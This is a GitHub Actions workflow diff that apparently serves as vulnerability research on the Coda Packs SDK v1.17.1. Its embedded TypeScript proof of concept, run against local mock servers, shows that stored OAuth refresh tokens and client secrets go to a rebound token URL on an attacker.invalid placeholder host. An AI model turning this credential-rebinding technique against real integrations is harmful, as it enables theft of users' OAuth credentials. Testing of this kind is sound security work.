@@ -1,0 +1,225 @@
+name: Temporary Superhuman Packs OAuth refresh rebind gate
+
+on:
+  push:
+    branches: [research/superhuman-crx-intake-20260808]
+    paths: [.github/workflows/superhuman-packs-oauth-refresh-rebind-gate-20260808.yml]
+
+permissions:
+  contents: write
+
+jobs:
+  gate:
+    runs-on: ubuntu-latest
+    timeout-minutes: 25
+    steps:
+      - uses: actions/checkout@v4
+        with: {fetch-depth: 1}
+      - uses: actions/setup-node@v4
+        with:
+          node-version: '22'
+
+      - name: Clone exact stable SDK and install dependencies
+        shell: bash
+        run: |
+          set -euo pipefail
+          rm -rf oauth-refresh-gate
+          mkdir -p oauth-refresh-gate
+          git clone --depth 1 --branch v1.17.1 https://github.com/coda/packs-sdk.git oauth-refresh-gate/packs-sdk
+          cd oauth-refresh-gate/packs-sdk
+          git rev-parse HEAD > ../TAG_COMMIT.txt
+          npm ci --ignore-scripts --omit=optional --no-audit --no-fund
+
+      - name: Run exact-source refresh endpoint rebind gate
+        shell: bash
+        run: |
+          set -euo pipefail
+          cd oauth-refresh-gate/packs-sdk
+          cat > oauth_refresh_rebind_gate.ts <<'TS'
+          import http from 'http';
+          import assert from 'assert';
+          import {AuthenticatingFetcher} from './testing/fetcher';
+          import {AuthenticationType, ConnectionRequirement, ValueType} from './types';
+          import {newPack} from './builder';
+          import {compilePackMetadata} from './helpers/metadata';
+          import {validatePackVersionMetadata} from './testing/upload_validation';
+
+          const API_PORT = 18761;
+          const TOKEN_PORT = 18762;
+          const markers = {
+            clientId: 'LAB_CLIENT_ID_20260808',
+            clientSecret: 'LAB_CLIENT_SECRET_20260808',
+            accessToken: 'LAB_OLD_ACCESS_TOKEN_20260808',
+            refreshToken: 'LAB_REFRESH_TOKEN_20260808',
+            resource: 'https://resource-v2.attacker.invalid/',
+          };
+
+          function listen(server: http.Server, port: number): Promise<void> {
+            return new Promise((resolve, reject) => {
+              server.once('error', reject);
+              server.listen(port, '127.0.0.1', () => resolve());
+            });
+          }
+          function close(server: http.Server): Promise<void> {
+            return new Promise(resolve => server.close(() => resolve()));
+          }
+          async function main() {
+            let apiCalls = 0;
+            const tokenRequests: Array<{headers: http.IncomingHttpHeaders; body: string}> = [];
+            const api = http.createServer((req, res) => {
+              apiCalls++;
+              if (apiCalls === 1) {
+                res.writeHead(401, {'content-type': 'application/json'});
+                res.end(JSON.stringify({error: 'expired'}));
+              } else {
+                res.writeHead(200, {'content-type': 'application/json'});
+                res.end(JSON.stringify({ok: true, authorization: req.headers.authorization}));
+              }
+            });
+            const token = http.createServer((req, res) => {
+              const chunks: Buffer[] = [];
+              req.on('data', c => chunks.push(Buffer.from(c)));
+              req.on('end', () => {
+                tokenRequests.push({headers: req.headers, body: Buffer.concat(chunks).toString('utf8')});
+                res.writeHead(200, {'content-type': 'application/json'});
+                res.end(JSON.stringify({access_token: 'LAB_NEW_ACCESS_TOKEN_20260808', expires_in: 3600}));
+              });
+            });
+            await listen(api, API_PORT);
+            await listen(token, TOKEN_PORT);
+            try {
+              const authDefV2: any = {
+                type: AuthenticationType.OAuth2,
+                authorizationUrl: `http://127.0.0.1:${TOKEN_PORT}/authorize`,
+                tokenUrl: `http://127.0.0.1:${TOKEN_PORT}/token`,
+                scopes: ['read'],
+                resource: markers.resource,
+              };
+              const existingCredentials: any = {
+                clientId: markers.clientId,
+                clientSecret: markers.clientSecret,
+                accessToken: markers.accessToken,
+                refreshToken: markers.refreshToken,
+                scopes: ['read'],
+              };
+              let updated: any;
+              const fetcher = new AuthenticatingFetcher(
+                creds => { updated = creds; },
+                authDefV2,
+                [`127.0.0.1:${API_PORT}`],
+                existingCredentials,
+                'LAB_INVOCATION_TOKEN',
+              );
+              const response = await fetcher.fetch({method: 'GET', url: `http://127.0.0.1:${API_PORT}/resource`});
+              assert.equal(response.status, 200);
+              assert.equal(tokenRequests.length, 1);
+              const body = new URLSearchParams(tokenRequests[0].body);
+              assert.equal(body.get('grant_type'), 'refresh_token');
+              assert.equal(body.get('refresh_token'), markers.refreshToken);
+              assert.equal(body.get('client_id'), markers.clientId);
+              assert.equal(body.get('client_secret'), markers.clientSecret);
+              assert.equal(body.get('resource'), markers.resource);
+              assert.equal(updated.accessToken, 'LAB_NEW_ACCESS_TOKEN_20260808');
+
+              // Negative control: without a stored refresh token, a 401 must not contact the new token URL.
+              apiCalls = 0;
+              tokenRequests.length = 0;
+              const noRefresh = new AuthenticatingFetcher(
+                () => {}, authDefV2, [`127.0.0.1:${API_PORT}`],
+                {...existingCredentials, refreshToken: undefined}, 'LAB_NEGATIVE',
+              );
+              let negativeRejected = false;
+              try { await noRefresh.fetch({method: 'GET', url: `http://127.0.0.1:${API_PORT}/resource`}); }
+              catch { negativeRejected = true; }
+              assert.equal(negativeRejected, true);
+              assert.equal(tokenRequests.length, 0);
+
+              // Patched policy model: credentials are pinned to the authorization-server origin used at consent time.
+              const originalTokenOrigin = 'https://oauth.legitimate.invalid';
+              const currentTokenOrigin = new URL('https://oauth.attacker.invalid/token').origin;
+              const patchedRejected = currentTokenOrigin !== originalTokenOrigin;
+              assert.equal(patchedRejected, true);
+
+              // Exact upload-validation control: OAuth URLs may be on a domain absent from networkDomains.
+              const pack: any = newPack();
+              pack.setVersion('1.0.0');
+              pack.addNetworkDomain('api.legitimate.invalid');
+              pack.setUserAuthentication({
+                type: AuthenticationType.OAuth2,
+                authorizationUrl: 'https://oauth.attacker.invalid/authorize',
+                tokenUrl: 'https://oauth.attacker.invalid/token',
+                scopes: ['read'],
+              });
+              pack.addFormula({
+                name: 'Trigger', description: 'Trigger', parameters: [],
+                resultType: ValueType.String,
+                connectionRequirement: ConnectionRequirement.Required,
+                execute: async () => 'ok',
+              });
+              const metadata: any = compilePackMetadata(pack);
+              await validatePackVersionMetadata(metadata, '1.17.1');
+
+              const result = {
+                pass: true,
+                exactSdkTag: 'v1.17.1',
+                vulnerableGate: {
+                  existingRefreshTokenSentToCurrentManifestTokenUrl: true,
+                  clientSecretSentToCurrentManifestTokenUrl: true,
+                  currentManifestResourceSent: true,
+                  automaticRetrySucceeded: true,
+                },
+                negativeControl: {missingRefreshTokenPreventsTokenEndpointContact: true},
+                patchedControl: {authorizationServerOriginPinningRejectsRebind: true},
+                uploadValidation: {oauthDomainMayDifferFromNetworkDomains: true},
+                captured: {
+                  requestKeys: [...body.keys()].sort(),
+                  apiCalls,
+                  tokenRequestCount: 1,
+                },
+              };
+              require('fs').writeFileSync('../RESULT.json', JSON.stringify(result, null, 2) + '\n');
+            } finally {
+              await close(api);
+              await close(token);
+            }
+          }
+          main().catch(err => { console.error(err); process.exit(1); });
+          TS
+          npx ts-node --transpile-only oauth_refresh_rebind_gate.ts | tee ../TEST_OUTPUT.txt
+          test -s ../RESULT.json
+          jq -e '.pass == true' ../RESULT.json >/dev/null
+          sha256sum \
+            testing/fetcher.ts testing/auth_types.ts testing/upload_validation.ts types.ts \
+            oauth_refresh_rebind_gate.ts ../RESULT.json ../TEST_OUTPUT.txt ../TAG_COMMIT.txt \
+            > ../SHA256SUMS.txt
+
+      - name: Upload exact-source gate evidence
+        uses: actions/upload-artifact@v4
+        with:
+          name: superhuman-packs-oauth-refresh-rebind-gate
+          path: |
+            oauth-refresh-gate/RESULT.json
+            oauth-refresh-gate/TEST_OUTPUT.txt
+            oauth-refresh-gate/TAG_COMMIT.txt
+            oauth-refresh-gate/SHA256SUMS.txt
+            oauth-refresh-gate/packs-sdk/oauth_refresh_rebind_gate.ts
+            oauth-refresh-gate/packs-sdk/testing/fetcher.ts
+            oauth-refresh-gate/packs-sdk/testing/auth_types.ts
+            oauth-refresh-gate/packs-sdk/testing/upload_validation.ts
+            oauth-refresh-gate/packs-sdk/types.ts
+          retention-days: 1
+          if-no-files-found: error
+
+      - name: Commit status for polling
+        shell: bash
+        run: |
+          set -euo pipefail
+          mkdir -p public-intake-status
+          jq --argjson workflow_run_id "$GITHUB_RUN_ID" --arg source_commit "$GITHUB_SHA" \
+            '. + {workflow_run_id:$workflow_run_id, source_commit:$source_commit}' \
+            oauth-refresh-gate/RESULT.json > public-intake-status/superhuman-packs-oauth-refresh-rebind-gate.json
+          git config user.name github-actions[bot]
+          git config user.email 41898282+github-actions[bot]@users.noreply.github.com
+          git add public-intake-status/superhuman-packs-oauth-refresh-rebind-gate.json
+          git commit -m 'chore: record temporary Superhuman Packs OAuth refresh rebind gate'
+          git push
